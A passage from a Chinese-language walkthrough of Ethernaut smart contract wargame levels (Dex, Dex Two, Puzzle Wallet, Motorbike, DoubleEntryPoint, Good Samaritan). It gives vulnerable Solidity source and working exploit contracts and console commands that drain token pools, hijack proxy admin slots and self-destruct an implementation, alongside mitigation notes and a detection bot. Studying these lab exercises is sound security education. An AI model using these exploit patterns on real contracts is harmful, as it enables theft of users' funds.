, \"Not enough to swap\" ); uint swapAmount = getSwapPrice ( from , to , amount ); IERC20 ( from ). transferFrom ( msg . sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swapAmount ); IERC20 ( to ). transferFrom ( address ( this ), msg . sender , swapAmount ); } function getSwapPrice ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( msg . sender , spender , amount ); SwappableToken ( token2 ). approve ( msg . sender , spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { address private _dex ; constructor ( address dexInstance , string memory name , string memory symbol , uint256 initialSupply ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialSupply ); _dex = dexInstance ; } function approve ( address owner , address spender , uint256 amount ) public { require ( owner != _dex , \"InvalidApprover\" ); super . _approve ( owner , spender , amount ); } } \u68b3\u7406\u5408\u7ea6 Dex \u63d0\u4f9b\u7684\u4ee3\u5e01\u4e92\u6362\u65b9\u5f0f \u6839\u636e\u8981\u4ea4\u6362\u7684 from \u4ee3\u5e01\u7684\u6570\u91cf amount \u3001 Dex \u5408\u7ea6 from \u548c to \u4ee3\u5e01\u7684\u4f59\u989d\u8ba1\u7b97\u4ea4\u6362\u5f97\u5230 to \u4ee3\u5e01\u7684\u6570\u91cf swapAmount \uff0c\u5373 swapAmount = amount * to.balance / from.balance \u5c06\u8981\u4ea4\u6362\u7684 from \u4ee3\u5e01\u5b58\u5165 Dex \u5408\u7ea6\uff0c swapAmount \u6570\u91cf\u7684 to \u4ee3\u5e01\u4ece Dex \u5408\u7ea6\u8f6c\u51fa \u82e5\u9996\u5148\u5c06 10 \u679a token1 \u8f6c\u6362\u4e3a token2 \uff0c\u6b64\u65f6 swapAmount \u4e3a 10\uff0c Dex \u5408\u7ea6 token1 \u7684\u4f59\u989d\u53d8\u4e3a 110\u3001 token2 \u7684\u4f59\u989d\u53d8\u4e3a 90\uff0c\u73a9\u5bb6\u5c06\u6301\u6709 20 \u679a token2 \u4ee3\u5e01\uff0c\u518d\u5c06\u5168\u90e8 token2 \u8f6c\u4e3a token1 \uff0c\u6b64\u65f6 swapAmount \u63d0\u9ad8\u5230 24\uff0c\u53ef\u89c1\u4e0d\u65ad\u8fdb\u884c\u4ee3\u5e01\u4e92\u6362\u5373\u53ef\u6e05\u7a7a Dex \u5408\u7ea6\u4e2d\u7684\u4e00\u79cd\u4ee3\u5e01 \u90e8\u7f72\u5408\u7ea6 Hack \uff0c\u5e76\u6388\u6743\u4f7f\u7528\u4ee3\u5e01 >> contract.approve(\"<hack-address>\", 10) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 contract Hack { function exploit ( address instance ) public { Dex dex = Dex ( instance ); address token1 = dex . token1 (); address token2 = dex . token2 (); IERC20 ( token1 ). transferFrom ( msg . sender , address ( this ), 10 ); IERC20 ( token2 ). transferFrom ( msg . sender , address ( this ), 10 ); while ( dex . balanceOf ( token1 , instance ) > 0 && dex . balanceOf ( token2 , instance ) > 0 ) { uint256 amount = dex . balanceOf ( token1 , address ( this )); // \u5c06\u6301\u6709\u7684\u4ee3\u5e01\u5168\u90e8\u7528\u4e8e\u4ea4\u6362 if ( amount > 0 ) { // \u9664\u7b2c\u4e00\u6b21\u4ea4\u6362\u5916\uff0c\u5408\u7ea6 Dex \u7684 to \u4ee3\u5e01\u7684\u4f59\u989d\u5fc5\u4e3a 110 // \u5f53 swapAmount \u5927\u4e8e Dex \u5408\u7ea6 to \u4ee3\u5e01\u7684\u4f59\u989d\u65f6\uff0c\u8bf4\u660e\u672c\u6b21\u4ea4\u6362\u80fd\u591f\u6e05\u7a7a to \u4ee3\u5e01 // \u5373\u53ef\u4ee5\u83b7\u5f97 110 \u679a to \u4ee3\u5e01\uff0c\u90a3\u4e48\u53c2\u4e0e\u4ea4\u6362\u7684 from \u4ee3\u5e01\u7684\u6570\u91cf\u5e94\u4e3a // 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance if ( dex . getSwapPrice ( token1 , token2 , amount ) > dex . balanceOf ( token2 , instance )) { amount = dex . balanceOf ( token1 , instance ); } dex . approve ( instance , amount ); dex . swap ( token1 , token2 , amount ); } else { amount = dex . balanceOf ( token2 , address ( this )); if ( dex . getSwapPrice ( token2 , token1 , amount ) > dex . balanceOf ( token1 , instance )) { amount = dex . balanceOf ( token2 , instance ); } dex . approve ( instance , amount ); dex . swap ( token2 , token1 , amount ); } } } } \u4e0d\u5e94\u4ece\u5355\u4e2a\u6765\u6e90\u83b7\u53d6\u4ef7\u683c\u6216\u5176\u5b83\u6570\u636e\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8e Oracles\uff0c\u5982 Chainlink Data Feeds 23. Dex Two \u00b6 \u6e05\u7a7a DexTwo \u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4ee3\u5e01 \u5408\u7ea6 DexTwo \u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 100 \u679a\uff0c\u73a9\u5bb6\u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 10 \u679a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; import 'openzeppelin-contracts-08/access/Ownable.sol' ; contract DexTwo is Ownable { address public token1 ; address public token2 ; constructor () {} function setTokens ( address _token1 , address _token2 ) public onlyOwner { token1 = _token1 ; token2 = _token2 ; } function add_liquidity ( address token_address , uint amount ) public onlyOwner { IERC20 ( token_address ). transferFrom ( msg . sender , address ( this ), amount ); } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg . sender ) >= amount , \"Not enough to swap\" ); uint swapAmount = getSwapAmount ( from , to , amount ); IERC20 ( from ). transferFrom ( msg . sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swapAmount ); IERC20 ( to ). transferFrom ( address ( this ), msg . sender , swapAmount ); } function getSwapAmount ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableTokenTwo ( token1 ). approve ( msg . sender , spender , amount ); SwappableTokenTwo ( token2 ). approve ( msg . sender , spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableTokenTwo is ERC20 { address private _dex ; constructor ( address dexInstance , string memory name , string memory symbol , uint initialSupply ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialSupply ); _dex = dexInstance ; } function approve ( address owner , address spender , uint256 amount ) public { require ( owner != _dex , \"InvalidApprover\" ); super . _approve ( owner , spender , amount ); } } \u76f8\u6bd4\u5408\u7ea6 Dex \uff0c\u5408\u7ea6 DexTwo \u5728\u8fdb\u884c\u8d27\u5e01\u4ea4\u6362\u65f6\u4e0d\u518d\u68c0\u67e5\u8f93\u5165\u53c2\u6570 from \u3001 to \uff0c\u56e0\u6b64\u53ef\u4ee5\u501f\u52a9\u5176\u5b83\u4ee3\u5e01\u6765\u6e05\u7a7a DexTwo \u4e2d\u7684 token1 \u548c token2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contract Hack { address [] tokens ; function exploit ( address instance ) public { DexTwo dex = DexTwo ( instance ); tokens . push ( dex . token1 ()); tokens . push ( dex . token2 ()); for ( uint8 i = 0 ; i < 2 ; i ++ ) { SwappableTokenTwo token = new SwappableTokenTwo ( instance , \"fake\" , \"F\" , 2 ); token . transfer ( instance , 1 ); token . approve ( address ( this ), instance , 1 ); dex . swap ( address ( token ), tokens [ i ], 1 ); } } } \u58f0\u660e\u5b9e\u73b0\u4e86 ERC20 \u6807\u51c6\u7684\u5408\u7ea6\u4e0d\u4e00\u5b9a\u53ef\u4fe1\uff0c\u90e8\u5206\u5408\u7ea6\u7684 \u51fd\u6570\u8fd4\u56de\u503c\u53ef\u80fd\u7f3a\u5931 \uff0c\u4e5f\u53ef\u80fd\u5b58\u5728\u6076\u610f\u884c\u4e3a \u66f4\u7b80\u5355\u5730\uff0c\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u6076\u610f\u7684 ERC20 \u5408\u7ea6 1 2 3 4 5 6 7 8 9 contract DexTwoAttackToken { function balanceOf ( address ) external pure returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) external pure returns ( bool ) { return true ; } } 1 2 >> contract . swap ( \"<DexTwoAttackTokenAddress>\" , await contract . token1 (), 1 ) >> contract . swap ( \"<DexTwoAttackTokenAddress>\" , await contract . token2 (), 1 ) 24. Puzzle Wallet \u00b6 \u6210\u4e3a\u4ee3\u7406\u5408\u7ea6\u7684\u7ba1\u7406\u5458 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; pragma experimental ABIEncoderV2 ; // redundant import \"../helpers/UpgradeableProxy-08.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) { admin = _admin ; } modifier onlyAdmin { require ( msg . sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg . sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg . sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg . sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg . sender ] += msg . value ; } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg . sender ] >= value , \"Insufficient balance\" ); balances [ msg . sender ] -= value ; ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector := mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u8c03\u7528\u903b\u8f91\u5408\u7ea6 PuzzleWallet \u76f8\u5173\u51fd\u6570\u9700\u8981\u5728\u767d\u540d\u5355\u5185\u4e14\u53ea\u6709 owner \u624d\u80fd\u6dfb\u52a0\u6307\u5b9a\u5730\u5740\u5230\u767d\u540d\u5355 1 2 3 4 >> await contract . whitelisted ( player ) false >> await contract . owner () \"<level-address>\" \u7531\u4e8e\u4f7f\u7528\u4ee3\u7406\u8c03\u7528\u7684\u65b9\u5f0f\uff0c\u4ee3\u7406\u5408\u7ea6\u7684 pendingAdmin \u4e0e\u903b\u8f91\u5408\u7ea6\u7684 owner \u5171\u4eab\u4e00\u4e2a slot\uff0c\u56e0\u800c\u53ef\u5148\u901a\u8fc7 proposeNewAdmin \u66f4\u65b0 owner \uff0c\u968f\u540e\u5c06\u73a9\u5bb6\u6dfb\u52a0\u5230\u767d\u540d\u5355\u4e2d \u540c\u7406\uff0c maxBalance \u4e0e admin \u5171\u4eab\u4e00\u4e2a slot\uff0c\u800c maxBalance \u53ef\u901a\u8fc7 setMaxBalance \u66f4\u65b0\uff0c\u4f46\u9996\u5148\u9700\u6e05\u7a7a\u4ee3\u7406\u5408\u7ea6\u7684\u4f59\u989d execute \u4f9d\u636e balances \u4e2d\u8bb0\u5f55\u7684\u5bf9\u5e94\u5730\u5740\u7684\u4f59\u989d\u8fdb\u884c\u8f6c\u8d26\uff0c\u800c balances \u53ea\u80fd\u901a\u8fc7 deposit \u6539\u53d8 \u6ce8\u610f\u5230 multicall \u4e2d depositCalled \u4e0d\u662f\u72b6\u6001\u53d8\u91cf\u800c\u662f\u51fd\u6570\u5185\u53d8\u91cf\uff0c\u56e0\u800c\u5d4c\u5957\u8c03\u7528 multicall \u53ef\u7ed5\u8fc7\u9650\u5236\u5229\u7528\u5355\u6b21 transfer \u8fdb\u884c\u91cd\u590d deposit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u90e8\u7f72\u540e\u5c06\u653b\u51fb\u5408\u7ea6\u6dfb\u52a0\u5230\u767d\u540d\u5355\u4e2d contract Hack { PuzzleWallet wallet ; constructor ( address instance ) { wallet = PuzzleWallet ( instance ); } // msg.value \u8bbe\u7f6e\u4e3a 0.001 eth\uff0c\u5373\u4ee3\u7406\u5408\u7ea6\u521d\u59cb\u4f59\u989d function exploit () external payable { bytes [] memory data = new bytes []( 2 ); bytes [] memory subdata = new bytes []( 1 ); data [ 0 ] = abi . encodeWithSignature ( \"deposit()\" ); subdata [ 0 ] = data [ 0 ]; data [ 1 ] = abi . encodeWithSignature ( \"multicall(bytes[])\" , subdata ); wallet . multicall { value : msg . value }( data ); wallet . execute ( msg . sender , msg . value * 2 , \"\" ); } } delegatecall \u4fdd\u6301\u5408\u7ea6\u88ab\u8c03\u7528\u65f6\u7684 msg.value 25. Motorbike \u00b6 \u8ba9 Engine \u81ea\u6bc1\uff0c\u4f7f Motorbike \u4e0d\u53ef\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"openzeppelin-contracts-06/utils/Address.sol\" ; import \"openzeppelin-contracts-06/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 // constant variable does not have a storage slot bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result := delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot := slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg . sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg . sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot := _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u4e0e\u900f\u660e\u4ee3\u7406\u6a21\u5f0f\u4e0d\u540c\uff0cUUPS \u4ee3\u7406\u6a21\u5f0f\u7531\u903b\u8f91\u5408\u7ea6\u8d1f\u8d23\u5347\u7ea7\u903b\u8f91\uff0c\u56e0\u800c\u4ee3\u7406\u5408\u7ea6\u90e8\u7f72\u7684\u4ee3\u4ef7\u8f83\u5c0f \u540c\u65f6 UUPS \u4ee3\u7406\u6a21\u5f0f\u8282\u7701\u4e86\u6bcf\u6b21\u68c0\u67e5\u7528\u6237\u662f\u5426\u4e3a owner \u7684\u5f00\u9500 upgrader \u53ef\u4ee5\u4f7f\u7528 upgradeToAndCall() \u66f4\u65b0\u903b\u8f91\u5408\u7ea6\u5e76\u8c03\u7528 Motorbike \u5728\u90e8\u7f72\u65f6\u901a\u8fc7 delegatecall \u8c03\u7528 Engine \u7684 initialize() \uff0c initialize() \u4f7f\u7528 initializer \u51fd\u6570\u4fee\u9970\u7b26\uff0c\u907f\u514d\u518d\u6b21\u521d\u59cb\u5316 initializer \u4fee\u9970\u7b26\u4f7f\u7528\u72b6\u6001\u53d8\u91cf initialized \u548c initializing \u8bb0\u5f55\u6216\u5224\u65ad\u521d\u59cb\u5316\u72b6\u6001 initialized \u5b58\u50a8\u5728 Motorbike \u5b9e\u4f8b\u4e2d\uff0c\u800c\u4e0d\u662f Engine \uff0c\u56e0\u800c\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 Engine \u5b9e\u4f8b\u7684 initialize() \u518d\u66f4\u65b0\u5176\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\u5e76\u8c03\u7528 \u4e0d\u8981\u8ba9\u903b\u8f91\u5408\u7ea6\u5904\u4e8e\u672a\u521d\u59cb\u5316\u72b6\u6001 Exploit \u00b6 1 2 3 // \u83b7\u53d6 Engine \u5b9e\u4f8b\u7684\u5730\u5740 >> await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ); \"0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab\" 1 2 3 4 5 6 7 // \u90e8\u7f72\u65b0\u7684\u903b\u8f91\u5408\u7ea6 contract Bomb { fallback () external { selfdestruct ( tx . origin ); } } // \u8c03\u7528 initialize \u6210\u4e3a upgrader\uff0c\u968f\u540e\u8c03\u7528 upgradeToAndCall() \u66f4\u65b0\u903b\u8f91\u5408\u7ea6 \u53c2\u8003\u8d44\u6599 \u00b6 UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum Proxies - OpenZeppelin Docs Constant and Immutable State Variables Writing Upgradeable Contracts - OpenZeppelin Docs 26. DoubleEntryPoint \u00b6 \u9632\u6b62\u5408\u7ea6 CryptoVault \u88ab\u6e05\u7a7a\u4ee3\u5e01 \u5b9e\u73b0\u80fd\u591f\u6b63\u786e\u544a\u8b66\u4ee5\u9632\u6b62\u6f5c\u5728\u653b\u51fb\u6216\u6f0f\u6d1e\u5229\u7528\u7684 detection bot \u5408\u7ea6\u5e76\u5728 Forta \u6ce8\u518c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/access/Ownable.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; interface DelegateERC20 { function delegateTransfer ( address to , uint256 value , address origSender ) external returns ( bool ); } interface IDetectionBot { function handleTransaction ( address user , bytes calldata msgData ) external ; } interface IForta { function setDetectionBot ( address detectionBotAddress ) external ; function notify ( address user , bytes calldata msgData ) external ; function raiseAlert ( address user ) external ; } contract Forta is IForta { mapping ( address => IDetectionBot ) public usersDetectionBots ; mapping ( address => uint256 ) public botRaisedAlerts ; function setDetectionBot ( address detectionBotAddress ) external override { usersDetectionBots [ msg . sender ] = IDetectionBot ( detectionBotAddress ); } function notify ( address user , bytes calldata msgData ) external override { if ( address ( usersDetectionBots [ user ]) == address ( 0 )) return ; try usersDetectionBots [ user ]. handleTransaction ( user , msgData ) { return ; } catch {} } function raiseAlert ( address user ) external override { if ( address ( usersDetectionBots [ user ]) != msg . sender ) return ; botRaisedAlerts [ msg . sender ] += 1 ; } } contract CryptoVault { address public sweptTokensRecipient ; // player IERC20 public underlying ; // DoubleEntryPoint constructor ( address recipient ) { sweptTokensRecipient = recipient ; } function setUnderlying ( address latestToken ) public { require ( address ( underlying ) == address ( 0 ), \"Already set\" ); underlying = IERC20 ( latestToken ); } /* ... */ function sweepToken ( IERC20 token ) public { require ( token != underlying , \"Can't transfer underlying token\" ); token . transfer ( sweptTokensRecipient , token . balanceOf ( address ( this ))); } } contract LegacyToken is ERC20 ( \"LegacyToken\" , \"LGT\" ), Ownable { DelegateERC20 public delegate ; function mint ( address to , uint256 amount ) public onlyOwner { _mint ( to , amount ); } function delegateToNewContract ( DelegateERC20 newContract ) public onlyOwner { delegate = newContract ; } function transfer ( address to , uint256 value ) public override returns ( bool ) { if ( address ( delegate ) == address ( 0 )) { return super . transfer ( to , value ); } else { return delegate . delegateTransfer ( to , value , msg . sender ); } } } contract DoubleEntryPoint is ERC20 ( \"DoubleEntryPointToken\" , \"DET\" ), DelegateERC20 , Ownable { address public cryptoVault ; address public player ; address public delegatedFrom ; Forta public forta ; constructor ( address legacyToken , address vaultAddress , address fortaAddress , address playerAddress ) { delegatedFrom = legacyToken ; forta = Forta ( fortaAddress ); player = playerAddress ; cryptoVault = vaultAddress ; _mint ( cryptoVault , 100 ether ); } modifier onlyDelegateFrom () { require ( msg . sender == delegatedFrom , \"Not legacy contract\" ); _ ; } modifier fortaNotify () { address detectionBot = address ( forta . usersDetectionBots ( player )); // Cache old number of bot alerts uint256 previousValue = forta . botRaisedAlerts ( detectionBot ); // Notify Forta forta . notify ( player , msg . data ); // Continue execution _ ; // Check if alarms have been raised if ( forta . botRaisedAlerts ( detectionBot ) > previousValue ) revert ( \"Alert has been triggered, reverting\" ); } function delegateTransfer ( address to , uint256 value , address origSender ) public override onlyDelegateFrom fortaNotify returns ( bool ) { _transfer ( origSender , to , value ); return true ; } } \u4f20\u5165 CryptoVault.sweepToken() \u4ee3\u5e01\u7684\u5730\u5740\u4e0d\u80fd\u7b49\u4e8e underlying \uff0c\u800c\u82e5\u4f20\u5165 LegacyToken \u7684\u5730\u5740\uff0c\u5c06\u8c03\u7528 delegateTransfer() \uff0c\u5b9e\u9645\u8f6c\u79fb\u7684\u662f CryptoVault \u6301\u6709\u7684 DET \u4ee3\u5e01\uff0c\u5bf9\u5e94 underlying \u82e5 origSender \u4e3a CryptoVault \u7684\u5b9e\u4f8b\u5219 raiseAlert 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract DetectionBot is IDetectionBot { address vault ; constructor ( address instance ) { DoubleEntryPoint dep = DoubleEntryPoint ( instance ); vault = dep . cryptoVault (); } function handleTransaction ( address user , bytes calldata msgData ) external { // skip the 4-byte function signature ( , , address sender ) = abi . decode ( msgData [ 4 : ], ( address , uint256 , address )); if ( sender == vault ) { IForta ( msg . sender ). raiseAlert ( user ); } } } \u90e8\u7f72 DetectionBot \u540e\uff0c\u4f7f\u7528 player \u8d26\u6237\u8c03\u7528 Forta.setDetectionBot() \u53ef\u4ee5\u5728 sweepToken() \u7684\u6700\u540e\u68c0\u67e5\u5408\u7ea6 underlying \u7684\u4f59\u989d\u662f\u5426\u548c\u8c03\u7528\u524d\u76f8\u540c \u53c2\u8003\u8d44\u6599 \u00b6 ABI Decode | Solidity by Example abi.decode cannot decode msg.data \u00b7 Issue #6012 \u00b7 ethereum/solidity TrueUSD \u2194 Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium 27. Good Samaritan \u00b6 \u6e05\u7a7a Good Samaritan \u94b1\u5305\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0 < 0.9.0 ; import \"openzeppelin-contracts-08/utils/Address.sol\" ; contract GoodSamaritan { Wallet public wallet ; Coin public coin ; constructor () { wallet = new Wallet (); coin = new Coin ( address ( wallet )); wallet . setCoin ( coin ); } function requestDonation () external returns ( bool enoughBalance ) { // donate 10 coins to requester try wallet . donate10 ( msg . sender ) { return true ; } catch ( bytes memory err ) { if ( keccak256 ( abi . encodeWithSignature ( \"NotEnoughBalance()\" )) == keccak256 ( err )) { // send the coins left wallet . transferRemainder ( msg . sender ); return false ; } } } } contract Coin { using Address for address ; mapping ( address => uint256 ) public balances ; error InsufficientBalance ( uint256 current , uint256 required ); constructor ( address wallet_ ) { // one million coins for Good Samaritan initially balances [ wallet_ ] = 10 ** 6 ; } function transfer ( address dest_ , uint256 amount_ ) external { uint256 currentBalance = balances [ msg . sender ]; // transfer only occurs if balance is enough if ( amount_ <= currentBalance ) { balances [ msg . sender ] -= amount_ ; balances [ dest_ ] += amount_ ; if ( dest_ . isContract ()) { // notify contract INotifyable ( dest_ ). notify ( amount_ ); } } else { // a gas-efficient way :) revert InsufficientBalance ( currentBalance , amount_ ); } } } contract Wallet { // The owner of the wallet instance address public owner ; Coin public coin ; error OnlyOwner (); error NotEnoughBalance (); modifier onlyOwner () { if ( msg . sender != owner ) { revert OnlyOwner (); } _ ; } constructor () { owner = msg . sender ; } function donate10 ( address dest_ ) external onlyOwner { // check balance left if ( coin . balances ( address ( this )) < 10 ) { revert NotEnoughBalance (); } else { // donate 10 coins coin . transfer ( dest_ , 10 ); } } function transferRemainder ( address dest_ ) external onlyOwner { // transfer balance left coin . transfer ( dest_ , coin . balances ( address ( this ))); } function setCoin ( Coin coin_ ) external onlyOwner { coin = coin_ ; } } interface INotifyable { function notify ( uint256 amount ) external ; } \u91cd\u590d\u8c03\u7528 requestDonation() \u80fd\u591f\u6e05\u7a7a\u94b1\u5305\u7684\u4f59\u989d\uff0c\u4f46\u9700\u8981\u8017\u8d39\u5927\u91cf\u7684\u6c7d\u6cb9 :( \u663e\u7136\uff0c\u8c03\u7528 Wallet.transferRemainder() \u662f\u6e05\u7a7a\u4f59\u989d\u7684\u6700\u4f73\u65b9\u6cd5\uff0c\u9700\u8981\u89e6\u53d1\u9519\u8bef NotEnoughBalance() \u3002\u7531\u4e8e\u9519\u8bef\u80fd\u901a\u8fc7\u8c03\u7528\u94fe\u4f20\u64ad\uff0c\u6839\u636e\u7b7e\u540d\u8fa8\u8bc6\uff08\u4e0e\u51fd\u6570\u8c03\u7528\u7c7b\u4f3c\uff09\uff0c\u4e14\u4e0d\u5305\u542b\u6765\u6e90\u5730\u5740\uff0c\u53ef\u76f4\u63a5\u5728 notify() \u4e2d\u89e6\u53d1 1 2 3 4 5 6 7 8 9 10 11 12 13 contract Notifyable is INotifyable { error NotEnoughBalance (); function exploit ( address instance ) external { GoodSamaritan ( instance ). requestDonation (); } function notify ( uint256 amount ) external { // \u5168\u90e8 revert 